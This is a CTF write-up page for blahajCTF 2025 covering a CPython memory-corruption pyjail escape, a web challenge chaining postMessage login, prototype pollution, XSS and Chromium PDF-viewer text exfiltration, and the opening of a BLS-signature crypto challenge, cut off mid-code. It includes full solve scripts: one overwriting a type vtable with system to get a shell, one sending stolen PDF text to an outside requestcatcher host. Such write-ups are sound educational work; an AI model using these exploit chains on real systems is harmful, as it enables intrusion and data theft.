  tp_free = 0x55555581f68c <PyObject_GC_Del>,
  tp_is_gc = 0x0,
  tp_bases = 0x7ffff7ba28f0,
  tp_mro = 0x7ffff7ba2940,
  tp_cache = 0x0,
  tp_subclasses = 0x7ffff79b1f10,
  tp_weaklist = 0x7ffff7bb1240,
  tp_del = 0x0,
  tp_version_tag = 0x3,
  tp_finalize = 0x0,
  tp_vectorcall = 0x5555556f88f7 <list_vectorcall>
}`}></Terminal>
                    <br></br>
                    <p>There are a lot of pointers in the vtable, and <a href='https://docs.python.org/3/c-api/typeobj.html'>this page</a> in the python documentation is great for finding out when they are called. I chose to overwrite <code className='code'>tp_str</code>, which is called when <code className='code'>str()</code> is called on the list.</p>
                    <br></br>
                    <p>This is analogous to a GOT overwrite, and I overwrote the vtable entry with the address of <code className='code'>system</code> by getting a libc leak with the same method as before. We can get the address of the <code className='code'>PyList_Type</code> vtable by finding the address of the <code className='code'>list</code> object in memory.</p>
                    <br></br>
                    <p>As for the <code className='code'>/bin/sh\0</code> argument, because the entire object is passed to <code className='code'>system</code>, we need to ensure the first field is <code className='code'>/bin/sh\0</code>. This means we have to overwrite the refcount of the object. This is not a problem, as an extremely large refcount does nothing but prevent the object from being freed.</p>
                    <br></br>
                    <p>However, there are two things we need to take note of. The first is that because bytearrays already flip the bytes due to little endian, there is no need to flip them again. The second is that the refcount will be incremented by one when we call <code className='code'>str(list)</code>, meaning we cannot overwrite the refcount with <code className='code'>/bin/sh\0</code>, but instead with <code className='code'>.bin/sh\0</code> (ascii value of "." is one less than that of "/").</p>
                    <br></br>
                    <p>With that being said, we can now solve the challenge. Below is my solvescript.</p>
                    <br></br>
                    <CodeBlock collapsible={true} collapseDefault={true} data={[{'name':'solve.py','language':'python','startingLineNumber':1,'code':`from pwn import *
from base64 import b64encode

code = '''
b = [1]
system_append(b,2)

c = bytearray(0)

for _ in range(8):
    my_append(b,bytearray)
my_append(b,print)
assert len(c) == id(print)

freegot = 0x000000948538
tp_str = id(list)+17*8

leak = 0
for i in range(8):
    leak += (c[freegot+i])*256**i

libcbase = leak-626400
systemaddr = libcbase+0x4c490

for i in range(8):
    c[tp_str+i] = systemaddr % 256
    systemaddr >>= 8

rce = []
refcnt = id(rce)

binsh = [46, 98, 105, 110, 47, 115, 104, 0] # .bin/sh\\\\0
for i in range(8):
    c[refcnt+i] = binsh[i]

str(rce)
'''


p = remote('localhost',1337)
# p = process(['./python3.11','chal.py'])
p.sendlineafter(b'script: ',b64encode(code.encode()))
p.interactive()`}]}></CodeBlock>
                    <br></br>
                    <p>As mentioned earlier, here's the flag.</p>
                    <br></br>
                    <Terminal text={`[+] Opening connection to localhost on port 1337: Done
[*] Switching to interactive mode
$ cat flag.txt
blahaj{1_l0v3_PyThoN_funny_snake}

thanks to cane, scuffed, and jiajie for playtesting
please open a ticket if you think you found an unintend (ie any pure-python (no pwn) pyjail escapes) (you'll still get the flag i just want to know if it can be cheesed)
$  `}></Terminal>
                    <br></br>

                    

















                    




                    <h1 id='web'>Web</h1>
                    <h2>Foreword</h2>
                    <p>Similarly to pwn, I solved a grand total of zero web challenges during the CTF. After the CTF, I took a look at the web and decided to upsolve them, and I will be writing up on the hardest and only unsolved web challenge.</p>
                    <br></br>
                    <h2 id='scriptures'>Scriptures</h2>
                    <p><i>The elders have collected the flag and turned it into a scripture.</i></p>
                    <p>Author: fern</p>
                    <br></br>
                    <h3>Foreword</h3>
                    <p>This was the hardest web challenge in the CTF, and it ended up getting zero solves! I upsolved it with the intended method, while there was an unintended solution found by another participant. In this writeup, I will be detailing my solve.</p>
                    <br></br>
                    <h3>The challenge</h3>
                    <Download filepath='downloads/blahajctf-2025/scriptures.zip' filename='dist.zip'/>
                    <br></br>
                    <p>We have quite a few files of source code. I'll attach them all here.</p>
                    <br></br>
                    <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'app.py','language':'python','startingLineNumber':1,'code':`import os
import hashlib
import subprocess
import shutil
import threading
import time
import tempfile
from functools import wraps
from flask import Flask, render_template, request, session, redirect, url_for, send_from_directory, abort, jsonify

app = Flask(__name__)
app.secret_key = os.urandom(24)
POW_DIFFICULTY = 5
POW_CLEAR_INTERVAL_SECONDS = 30
CHROMIUM_TIMEOUT = 60
USED_POW_HASHES = set()

def clear_pow_set_periodically():
    global USED_POW_HASHES
    while True:
        time.sleep(POW_CLEAR_INTERVAL_SECONDS)
        USED_POW_HASHES.clear()

def admin_bot_visit(url):
    temp_dir = None
    chromium_path = shutil.which('chromium-browser') or shutil.which('chromium')
    if not chromium_path:
        print("[!] ERROR: Chromium not found. Cannot visit URL.")
        return
    print(f"[*] The Head Librarian is visiting: {url}")
    try:
        temp_dir = tempfile.mkdtemp()
        cmd = [
            chromium_path, '--disable-gpu', '--no-sandbox', '--headless',
            '--disable-popup-blocking', f'--user-data-dir={temp_dir}', url
        ]
        subprocess.run(cmd, timeout=CHROMIUM_TIMEOUT, check=True, capture_output=True)
        print(f"[*] Visit complete for: {url}")
    except subprocess.TimeoutExpired:
        print(f"[!] Visit timed out for: {url}")
    except Exception as e:
        print(f"[!] Error during visit: {e}")
    finally:
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('username') != 'admin' or request.remote_addr != '127.0.0.1':
            return render_template('error.html', message="Forbidden: You lack the authority to view these sacred texts."), 403
        return f(*args, **kwargs)
    return decorated_function

@app.route('/api/motd')
def motd():
    messages = [
        "The journey of a thousand miles begins with a single step. - Laozi",
        "To know what you know and what you do not know, that is true knowledge. - Confucius",
        "He who is contented is rich. - Laozi"
    ]
    return jsonify(messages)

@app.route('/')
def index():
    return render_template('index.html', difficulty=POW_DIFFICULTY)

@app.route('/submit_scripture', methods=['POST'])
def submit_scripture():
    pow_solution = request.form.get('pow_solution')
    if not pow_solution:
        return render_template('index.html', difficulty=POW_DIFFICULTY, error="The Gatekeeper requires a solution.")
    solution_hash = hashlib.sha256(pow_solution.encode()).hexdigest()
    if solution_hash in USED_POW_HASHES:
        return render_template('index.html', difficulty=POW_DIFFICULTY, error="This seal has already been used.")
    if not solution_hash.startswith('0' * POW_DIFFICULTY):
        return render_template('index.html', difficulty=POW_DIFFICULTY, error="Invalid solution. The elders are not appeased.")
    USED_POW_HASHES.add(solution_hash)
    url = request.form.get('url')
    if not url or not url.lower().endswith('.pdf'):
        return render_template(
            'index.html', 
            difficulty=POW_DIFFICULTY, 
            error="Submission rejected. Only true scrolls (URLs ending in .pdf) are accepted."
        )
    submitter = session.get('username', 'An anonymous scholar')
    bot_thread = threading.Thread(target=admin_bot_visit, args=(url,))
    bot_thread.start()
    
    return render_template('index.html', difficulty=POW_DIFFICULTY, message="The Head Librarian is reviewing your scroll now.")

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if request.remote_addr == '127.0.0.1':
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return render_template('login.html', error='Invalid credentials. The elders are displeased.')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

@app.route('/scriptures')
@admin_required
def list_scriptures():
    scripture_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'scriptures')
    if not os.path.exists(scripture_path):
        os.makedirs(scripture_path)
    files = [f for f in os.listdir(scripture_path) if f.endswith('.pdf')]
    return render_template('scriptures.html', files=files)

@app.route('/scriptures/<path:filename>')
@admin_required
def get_scripture(filename):
    sec_fetch_site = request.headers.get('Sec-Fetch-Site')
    sec_fetch_mode = request.headers.get('Sec-Fetch-Mode')
    if sec_fetch_site == 'cross-site' or sec_fetch_mode != 'navigate':
        abort(403)
    return send_from_directory('scriptures', filename, as_attachment=False, conditional=False)

if __name__ == '__main__':
    pow_thread = threading.Thread(target=clear_pow_set_periodically, daemon=True)
    pow_thread.start()
    app.run(host='0.0.0.0', port=1337)`},
    
    



{'name':'index.html','language':'html','startingLineNumber':1,'code':`{% extends "layout.html" %}
{% block content %}
    <h2>Submit a Scripture</h2>
    <p>Any scholar may submit a URL pointing to a scripture. The Head Librarian will visit it shortly.</p>

    {% if message %}
        <p class="success">{{ message }}</p>
    {% endif %}
    
    {% if error %}
        <p class="error">{{ error }}</p>
    {% endif %}

    <form action="/submit_scripture" method="post">
        <div style="background-color: #fffaf0; border: 1px dashed #8b4513; padding: 15px; margin-bottom: 20px;">
            <h3>The Gatekeeper's Riddle</h3>
            <p>To prevent spiritual spam, please provide a string whose SHA256 hash starts with <strong>{{ difficulty }}</strong> zeros.</p>
            
            <label for="pow_solution">Riddle Solution:</label>
            <input type="text" id="pow_solution" name="pow_solution" required placeholder="Solve automatically below...">
            
            <br><br>
            <button type="button" id="solve-pow-button" data-difficulty="{{ difficulty }}">Ponder the riddle</button>
            <p id="solver-status" style="font-style: italic; color: #664228; font-size: 0.9em;"></p>
        </div>

        <label for="url">URL of the Scripture:</label>
        <input type="text" id="url" name="url" size="50" required>
        <button type="submit">Submit for Review</button>
    </form>
    <script src="https://cdn.jsdelivr.net/npm/js-sha256@0.9.0/src/sha256.min.js"></script>
    <script>
        function generateRandomPrefix(length) {
            if (window.crypto && window.crypto.getRandomValues) {
                const randomBytes = new Uint8Array(length);
                window.crypto.getRandomValues(randomBytes);
                return Array.from(randomBytes).map(b => b.toString(16).padStart(2, '0')).join('');
            }
            else {
                console.warn('crypto.getRandomValues not available. Using Math.random() as a fallback.');
                let result = '';
                const characters = '0123456789abcdef';
                for (let i = 0; i < length * 2; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
        }
        const solveButton = document.getElementById('solve-pow-button');
        const solutionInput = document.getElementById('pow_solution');
        const solverStatus = document.getElementById('solver-status');

        if (solveButton) {
            solveButton.addEventListener('click', async () => {
                solveButton.disabled = true;
                solverStatus.textContent = 'Pondering the riddle...';

                const difficulty = parseInt(solveButton.dataset.difficulty, 10);
                const targetPrefix = '0'.repeat(difficulty);

                const randomPrefix = generateRandomPrefix(5);
                console.log(\`Starting PoW search with random prefix: \${randomPrefix}\`);

                let counter = 0;
                let solution = '';
                while (true) {
                    const solutionAttempt = randomPrefix + counter;
                    const currentHash = sha256(solutionAttempt);

                    if (currentHash.startsWith(targetPrefix)) {
                        solution = solutionAttempt;
                        solverStatus.textContent = \`✅ The elders accept your answer! (\${counter} attempts)\`;
                        console.log(\`Solution: \${solution} -> Hash: \${currentHash}\`);
                        break;
                    }

                    counter++;
                    if (counter % 50000 === 0) {
                        solverStatus.textContent = \`Pondering the riddle... (Pondered: \${counter} times)\`;
                        await new Promise(resolve => setTimeout(resolve, 0));
                    }
                }

                if (solutionInput) {
                    solutionInput.value = solution;
                }
                solveButton.disabled = false;
            });
        }
    </script>
{% endblock %}`},







{'name':'login.html','language':'html','startingLineNumber':1,'code':`{% extends "layout.html" %}
{% block content %}
    <h2>Enter the Library</h2>
    {% if error %}
        <p class="error">{{ error }}</p>
    {% endif %}
    <form method="post" id="loginForm">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password"><br><br>
        <button type="submit" id="loginBtn">Login</button>
    </form>

    <script>
        function isPrimitive(value) {
            return value !== Object(value);
        }
        function merge(target, source) {
            for (let key in source) {
                if (isPrimitive(target[key])) {
                    target[key] = source[key];
                } else {
                    merge(target[key], source[key]);
                }
            }
        }
        
        window.addEventListener('message', (event) => {
            let loginData = {
                user: { name: "" },
                pass: ""
            };

            let parsedData;
            try {
                parsedData = (typeof event.data === 'string') ? JSON.parse(event.data) : event.data;
            } catch (e) {
                console.error("Invalid JSON in postMessage");
                return;
            }
            merge(loginData, parsedData);
            if (loginData.user && loginData.user.name) {
                document.getElementById('username').value = loginData.user.name;
            }
            if (loginData.pass) {
                document.getElementById('password').value = loginData.pass;
            }
            if (parsedData.action === 'clickLogin') {
                console.log("Automatically clicking login button...");
                document.getElementById('loginBtn').click();
            }
        });
    </script>
{% endblock %}`},








{'name':'layout.html','language':'html','startingLineNumber':1,'code':`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Ancient Scripture Library</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <header>
        <nav class="user-nav">
            {% if session.username %}
                <span>Welcome, {{ session.username }}</span>
                {% if session.username == 'admin' %}
                    <a href="{{ url_for('list_scriptures') }}">Protected Archives</a>
                {% endif %}
                <a href="{{ url_for('logout') }}">Logout</a>
            {% else %}
                <a href="{{ url_for('login') }}">Login</a>
            {% endif %}
        </nav>
        
        <h1>The Imperial Library of Ancient Scrolls</h1>
        <div id="motd-container">
            <p class="motd">Receiving wisdom from the heavens...</p>
        </div>
    </header>
    <main>
        {% block content %}{% endblock %}
    </main>
    <footer>
        <p>Preserving wisdom for generations.</p>
    </footer>

    <script>
        function fetchMotd() {
            fetch('/api/motd')
                .then(response => response.json())
                .then(data => {
                    const container = document.getElementById('motd-container');
                    container.innerHTML = '';
                    let index = 0;
                    while (data[index] != null) {
                        const p = document.createElement('p');
                        p.className = 'motd';
                        p.innerHTML = "Message from the Sages: " + data[index];
                        container.appendChild(p);
                        index++;
                    }
                })
                .catch(error => {
                    console.error("Could not fetch wisdom:", error);
                    const container = document.getElementById('motd-container');
                    container.innerHTML = '<p class="motd error">The connection to the spirits has been lost.</p>';
                });
        }
        window.onload = function() {
            fetchMotd();
            setInterval(fetchMotd, 20000);
        };
    </script>
</body>
</html>`},









{'name':'scriptures.html','language':'html','startingLineNumber':1,'code':`{% extends "layout.html" %}
{% block content %}
    <h2>Sacred Texts (Admin View)</h2>
    <p>These texts are only accessible to the head librarian from the temple grounds.</p>
    <ul>
        {% for file in files %}
            <li><a href="{{ url_for('get_scripture', filename=file) }}" target="_blank">{{ file }}</a></li>
        {% else %}
            <li>No scriptures found in the archive.</li>
        {% endfor %}
    </ul>
{% endblock %}`},









{'name':'error.html','language':'html','startingLineNumber':1,'code':`{% extends "layout.html" %}
{% block content %}
    <h2>Access Denied</h2>
    <p class="error">{{ message }}</p>
    <a href="{{ url_for('index') }}">Return to the main hall</a>
{% endblock %}`}]}></CodeBlock>
                    <br></br>
                    <p>Wow, that is a LOT of code! I'll try my best to explain it, however I encourage you to read the source code yourself to gain a full understanding.</p>
                    <br></br>
                    <p>Firstly, we have <code className='code'>app.py</code>. We have an admin bot, which hints at XSS. We can make the admin bot visit any url that ends with .pdf (along with a proof-of-work (PoW) to prevent request spamming). There is also login functionality, which only allows you to log in if your IP address is <code className='code'>127.0.0.1</code>, i.e. only the admin bot. Logging in is required to access the "scriptures", which consists of <code className='code'>flag.pdf</code>. However, the flag has a few sec-fetch headers on it. Cross-site GETs are blocked, and navigation is the only accepted fetching mode. This rules out exfiltrating the flag with regular http requests. All other features are just for the storyline and pointless for functionality, e.g. the message of the day.</p>
                    <br></br>
                    <p>Next, we have the HTML files. I'll only explain the scripts in them because the HTML is purely a frontend wrapper to the server.</p>
                    <p><code className='code'>index.html</code> has code that helps us solve the PoW, and <code className='code'>login.html</code> has code that allows a login through a postMessage. Additionally, <code className='code'>layout.html</code> is loaded at the top of every HTML page, displaying the messages of the day</p>
                    <br></br>
                    <p>Now that we understand what the code is doing, let's proceed into the exploitation!</p>
                    <br></br>
                    <h3>XSS #1</h3>
                    <p>Let's take a look at the code to submit a url to the admin bot.</p>
                    <br></br>
                    <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'app.py','language':'python','startingLineNumber':68,'code':`@app.route('/submit_scripture', methods=['POST'])
def submit_scripture():
    pow_solution = request.form.get('pow_solution')
    if not pow_solution:
        return render_template('index.html', difficulty=POW_DIFFICULTY, error="The Gatekeeper requires a solution.")
    solution_hash = hashlib.sha256(pow_solution.encode()).hexdigest()
    if solution_hash in USED_POW_HASHES:
        return render_template('index.html', difficulty=POW_DIFFICULTY, error="This seal has already been used.")
    if not solution_hash.startswith('0' * POW_DIFFICULTY):
        return render_template('index.html', difficulty=POW_DIFFICULTY, error="Invalid solution. The elders are not appeased.")
    USED_POW_HASHES.add(solution_hash)
    url = request.form.get('url')
    if not url or not url.lower().endswith('.pdf'):
        return render_template(
            'index.html', 
            difficulty=POW_DIFFICULTY, 
            error="Submission rejected. Only true scrolls (URLs ending in .pdf) are accepted."
        )
    submitter = session.get('username', 'An anonymous scholar')
    bot_thread = threading.Thread(target=admin_bot_visit, args=(url,))
    bot_thread.start()
    
    return render_template('index.html', difficulty=POW_DIFFICULTY, message="The Head Librarian is reviewing your scroll now.")`}]}></CodeBlock>
                    <br></br>
                    <p>We notice that there is no validation for the origin of the url! Now we have XSS on the admin bot! Wow, that was easy!</p>
                    <p>...is what I would have said if that were the case. There's just <i>one small problem</i>.</p>
                    <p>The sec-fetch headers. While we have XSS on the admin bot, which allows us to log in and access the scriptures, we still need to transfer the execution context to the scriptures site to access the flag.</p>
                    <br></br>
                    <h3>Prototype Pollution</h3>
                    <p>The login code looks a bit weird.</p>
                    <br></br>
                    <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'login.html','language':'html','startingLineNumber':15,'code':`    <script>
        function isPrimitive(value) {
            return value !== Object(value);
        }
        function merge(target, source) {
            for (let key in source) {
                if (isPrimitive(target[key])) {
                    target[key] = source[key];
                } else {
                    merge(target[key], source[key]);
                }
            }
        }
        
        window.addEventListener('message', (event) => {
            let loginData = {
                user: { name: "" },
                pass: ""
            };

            let parsedData;
            try {
                parsedData = (typeof event.data === 'string') ? JSON.parse(event.data) : event.data;
            } catch (e) {
                console.error("Invalid JSON in postMessage");
                return;
            }
            merge(loginData, parsedData);
            if (loginData.user && loginData.user.name) {
                document.getElementById('username').value = loginData.user.name;
            }
            if (loginData.pass) {
                document.getElementById('password').value = loginData.pass;
            }
            if (parsedData.action === 'clickLogin') {
                console.log("Automatically clicking login button...");
                document.getElementById('loginBtn').click();
            }
        });
    </script>`}]}></CodeBlock>
                <br></br>
                <p>If we submit a key that is <code className='code'>'__proto__'</code>, we can control the prototype of <code className='code'>loginData</code>, which is <code className='code'>Object.prototype</code>. Great, now all we need to do is to find a sink.</p>
                <br></br>
                <h3>XSS #2</h3>
                <p>Remember earlier, when I said that <code className='code'>layout.html</code> is placed at the top of every other HTML file? Yeah, I only noticed that after re-reading the code. I wasted three whole hours.</p>
                <p>Note to self: don't skip the first line of html files, they aren't always useless headers.</p>
                <br></br>
                <p>Anyways, let's look at <code className='code'>layout.html</code>, which is loaded into the top of <code className='code'>login.html</code>.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'layout.html','language':'html','startingLineNumber':34,'code':`    <script>
        function fetchMotd() {
            fetch('/api/motd')
                .then(response => response.json())
                .then(data => {
                    const container = document.getElementById('motd-container');
                    container.innerHTML = '';
                    let index = 0;
                    while (data[index] != null) {
                        const p = document.createElement('p');
                        p.className = 'motd';
                        p.innerHTML = "Message from the Sages: " + data[index];
                        container.appendChild(p);
                        index++;
                    }
                })
                .catch(error => {
                    console.error("Could not fetch wisdom:", error);
                    const container = document.getElementById('motd-container');
                    container.innerHTML = '<p class="motd error">The connection to the spirits has been lost.</p>';
                });
        }
        window.onload = function() {
            fetchMotd();
            setInterval(fetchMotd, 20000);
        };
    </script>`}]}></CodeBlock>
                <br></br>
                <p>Oh, is that a beautiful proto pollution sink I see right there? If we set <code className='code'>Object.prototype['3']</code> to our xss, it gets placed into the html. Thankfully, this function is triggered every 20 seconds, and not just upon loading. Nice, now we can navigate to the flag, but how do we read it...?</p>
                <br></br>
                <h3>PDF Exfiltration</h3>
                <p>We've reached the fun (and last) part of the solve. Somehow I ended up taking the least time here although it's supposed to be the hardest. Well, serves me right for not reading code properly.</p>
                <br></br>
                <p>The question at hand is, given the ability to navigate to the PDF, how do we exfiltrate it? Before answering the question, here is a hint that the challenge author shared slightly before the CTF ended, at the point of which it still had 0 solves (and it remained so until the end of the CTF).</p>
                <br></br>
                <img style={{borderRadius: '10px', width: 'max(40vw,35vh)'}} src={scripturesHint}></img>
                <br></br>
                <br></br>
                <p>This reveals two things:</p>
                <ol style={{paddingLeft:'2vw'}}>
                    <li>We are meant to exfiltrate the PDF from the iframe (or in this case embed) and not by bypassing sec-fetch</li>
                    <li>We need to read the source of the Chromium equivalent of <code className='code'>pdf.js</code>, which is the Chromium pdf viewer</li>
                </ol>
                <br></br>
                <p>Note: you can actually bypass sec-fetch by navigating to the flag url, which places the url in the cache, then fetching from the cache, which is the other (and unintended) solution to this challenge. However this was not my solution so I will not elaborate much on it.</p>
                <br></br>
                <p>With all that out of the way, let's look at the source of the pdf viewer.</p>
                <br></br>
                <p>There are many places to read chromium source code, but there is a nice one that allows you to search across files in the code, which proved extremely useful when I was attempting the challenge. You can find it <a href='https://source.chromium.org/' target="_blank">here</a>. As for the pdf viewer, it is quite misleading that there is a folder titled <code className='code'>pdf</code> within the root directory. The code of the pdf viewer actually lies in <code className='code'>/chrome/browser/resources/pdf/</code>. Let's first look at <code className='code'>main.ts</code>.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'main.ts','language':'ts','startingLineNumber':55,'code':`/**
 * Entrypoint for starting the PDF viewer. This function obtains the browser
 * API for the PDF and initializes the PDF Viewer.
 */
function main() {
  // Set up an event listener to catch scripting messages which are sent prior
  // to the PDFViewer being created.
  window.addEventListener('message', handleScriptingMessage, false);
  let chain = createBrowserApi();

  // Content settings may not be present in test environments.
  if (chrome.contentSettings) {
    chain = chain.then(configureJavaScriptContentSetting);
  }

  chain.then(initViewer);
}`}]}></CodeBlock>
                <br></br>
                <p>Hmm, it seems we can <code className='code'>postMessage</code> to the embed. Let's see where <code className='code'>handleScriptingMessage</code> leads to.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'pdf-viewer.ts','language':'ts','startingLineNumber':943,'code':`  override handleScriptingMessage(message: MessageEvent<any>) {
    if (super.handleScriptingMessage(message)) {
      return true;
    }

    if (this.delayScriptingMessage(message)) {
      return true;
    }

    let messageType;
    switch (message.data.type.toString()) {
      case 'getSelectedText':
        messageType = PostMessageDataType.GET_SELECTED_TEXT;
        this.pluginController_.getSelectedText().then(
            this.handleSelectedTextReply.bind(this));
        break;
      case 'print':
        messageType = PostMessageDataType.PRINT;
        this.pluginController_.print();
        break;
      case 'selectAll':
        messageType = PostMessageDataType.SELECT_ALL;
        this.pluginController_.selectAll();
        break;
      default:
        return false;
    }

    recordEnumeration(
        'PDF.PostMessageDataType', messageType,
        Object.keys(PostMessageDataType).length);
    return true;
  }`}]}></CodeBlock>
                <br></br>
                <p>Hmm, it seems we can select all text in the PDF, and send it to ourselves! The <code className='code'>handleSelectedTextReply</code> function calls a chain of functions, and it would be quite troublesome and pointless to show all of them, but in the end it calls a <code className='code'>postMessage</code> back to the origin.</p>
                <br></br>
                <p>However, it is important to note that opening the PDF file in the chromium pdf viewer will block the <code className='code'>postMessage</code>, and we have to place the PDF embed into our site with our XSS. Thankfully, this still counts as a navigation as the site/pdf being embedded appears on our page just like a normal navigation.</p>
                <br></br>
                <h3>Putting it all together</h3>
                <p>Now that we have all the mechanisms required to solve this challenge, we just need to put it together!</p>
                <br></br>
                <p>We can bypass the pdf extension check by sending <code className='code'>https://your-site.com/url#.pdf</code>, but regardless we could just make a .pdf url redirect to our site just as easily.</p>
                <br></br>
                <p>We open a new browser window so our XSS (from our own site) does not get wiped due to redirecting. The login system also uses <code className='code'>window.addEventListener()</code>, which makes it possible to use <code className='code'>postMessage</code> to communicate from our XSS code to the new window.</p>
                <br></br>
                <p>Afterwards we just chain the login, prototype pollution, XSS and PDF exfiltration in that order.</p>
                <br></br>
                <p>Here's my full solvescript.</p>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={true} data={[{'name':'solve.html','language':'html','startingLineNumber':1,'code':`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        function sleep(ms) {
           return new Promise(resolve => setTimeout(resolve, ms));
        }
        async function main() {
            let xss = \`{"__proto__":{"3":"<embed class='pdf' src='http://localhost:1337/scriptures/flag.pdf'><img src=x onerror=\\\\"
                fetch('https://[catcher].requestcatcher.com/xss',{method:'POST',body: 'xss triggered'});

                window.addEventListener('message', e => {
                    fetch('https://[catcher].requestcatcher.com/xss',{method:'POST',body: e.data.selectedText});
                });

                let embed = document.querySelector('embed');
                embed.postMessage({type:'selectAll'},'*');
                embed.postMessage({type:'getSelectedText'},'*');
            \\\\">"}}\`
            
            
            await sleep(1000);
            let tab = window.open('http://localhost:1337/login');
            await sleep(1000);
            tab.postMessage(\`{"user":{"name":"admin"},"action":"clickLogin"}\`,'*');
            await sleep(1000);
            tab.location.href = 'http://localhost:1337/login';
            await sleep(1000);
            tab.postMessage(xss.replace(/\\n/g, '').replace(/\\s{2,}/g,'').trim(),'*');
            await sleep(25000);
            tab.close();
        }
        main();
    </script>
</body>
</html>`}]}></CodeBlock>
                <br></br>
                <p>And we get the flag!</p>
                <br></br>
                <img style={{borderRadius: '10px',width: 'max(35vh,40vw)'}} src={scripturesSolved}></img>
                <br></br>
                <br></br>










                
                <h1 id='crypto'>Crypto</h1>
                <h2>Foreword</h2>
                <p>Saving my favourite for last, crypto, the category I main. I solved all but one challenge during the CTF, and I will be detailing my solve on the three challenges that I feel are the hardest. Here we go!</p>
                <br></br>
                <h2 id='baconlettucesalami'>baconlettucesalami</h2>
                <p><i>make me a delicious sandwich.</i></p>
                <p>Author: Warri</p>
                <br></br>
                <h3>Foreword</h3>
                <p>This was the hardest crypto challenge of the qualifiers, and I managed to get the second solve on it! Although my solve was...funny, to say the least.</p>
                <br></br>
                <h3>The challenge</h3>
                <br></br>
                <CodeBlock collapsible={true} collapseDefault={false} data={[{'name':'chall.py','language':'python','startingLineNumber':1,'code':`from sage.all import GF, EllipticCurve, randint, PolynomialRing
from hashlib import sha256

proof.all(False)

# ===========================================================================================================
# Set up might take a while on the ncat fyi. Be Patient! Sound a ticket if nothing appears after 2-3 minutes.
# ===========================================================================================================

p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab
r = 0x73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001

# https://ask.sagemath.org/question/74403/points-must-be-on-same-curve-ate_pairing-bls12-381/
Fp = GF(p)
F12 = GF(p**12, name='a'); a = F12.gens()[0]
RF = PolynomialRing(F12, name='T'); T = RF.gens()[0]
j = (T**2 + 1).roots(ring=RF, multiplicities=0)[0]

E0 = EllipticCurve(Fp, [0, 4])
E1 = EllipticCurve(F12, [0, 4])
E2 = EllipticCurve(F12, [0, 4*(j+1)])
phi = E2.isomorphism_to(E1)             # onoes this is an isogeny

x1 = 0x17f1d3a73197d7942695638c4fa9ac0fc3688c4f9774b905a14e3a3f171bac586c55e83ff97a1aeffb3af00adb22c6bb
y1 = 0x08b3f481e3aaa0f1a09e30ed741d8ae4fcf5e095d5d00af600db18cb2c04b3edd03cc744a2888ae40caa232946c5e7e1
G1 = E1(x1, y1)

x2 = ( 0x024AA2B2F08F0A91260805272DC51051C6E47AD4FA403B02B4510B647AE3D1770BAC0326A805BBEFD48056C8C121BDB8
       + 0x13E02B6052719F607DACD3A088274F65596BD0D09920B61AB5DA61BBDC7F5049334CF11213945D57E5AC7D055D042B7E * j )
y2 = ( 0x0CE5D527727D6E118CC9CDC6DA2E351AADFD9BAA8CBDD3A76D429A695160D12C923AC9CC3BACA289E193548608B82801
       + 0x0606C4A02EA734CC32ACD2B02BC28B99CB3E287E85A763AF267492AB572E99AB3F370D275CEC1DA1AAA9075FF05F79BE * j )
G2 = E2(x2, y2)

def KeyGen():
    sk = randint(1, r-1)
    pk = sk * G2
    return sk, pk

def H(m):
    h = int(sha256(m).hexdigest(), 16) % r
    return h * G1

def Sign(sk, m):
    σ = sk * H(m)
    return σ

def Verify(pk, m, σ):
    e0, e1 = σ.weil_pairing(phi(G2), r), H(m).weil_pairing(phi(pk), r)
    return e0 == e1

def VerifyAggregate(PK, m, Σ):
    e0, e1 = sum(Σ).weil_pairing(phi(G2), r), H(m).weil_pairing(phi(sum(PK)), r)
    return e0 == e1

FLAG = 'blahaj{REDACTEDREDACTED}' # 24
assert len(FLAG) == 24

sk_A, pk_A = KeyGen()
sk_B, pk_B = KeyGen()
sk_C, pk_C = KeyGen()
PK = [pk_A, pk_B, pk_C]
SK = [sk_A, sk_B, sk_C]
SIGS = []

print(f'[Alice] Hi everyone! My public key is {pk_A.x().list()}')
print(f'[Bob] oo ok, mine\'s {pk_B.x().list()}')
print(f'[You] {pk_C.x().list()}')

while True:
    print("1. Sign message (Indiv)\\n2. Sign message (Group)\\n3. Change Keys (Indiv)\\n4. Open The Vault (Group)")
    inp = int(input("> "))
    if inp == 1:
        msg = str(input("Enter message > ")).encode()
        σ = Sign(sk_C, msg)
        SIGS.append((msg, σ))
        print(f'[SERVER] Your signature: {σ.x().list()}')
    elif inp == 2:
        print("[Alice] Okay everyone, lets do this together! We will all sign 'We'll share the flag equally among ourselves', kay?")
        print("[Bob] lgtm!")
        print("[You] sure...")
        σA = Sign(sk_A, b'We\\'ll share the flag equally among ourselves')
        σB = Sign(sk_B, b'We\\'ll share the flag equally among ourselves')
        σC = Sign(sk_C, b'We\\'ll share the flag equally among ourselves')
        SIGS.append((b'We\\'ll share the flag equally among ourselves', σA, σB, σC))
        print(f'[SERVER] Alice signature: {σA.x().list()}')
        print(f'[SERVER] Bob signature: {σB.x().list()}')
        print(f'[SERVER] Your signature: {σC.x().list()}')
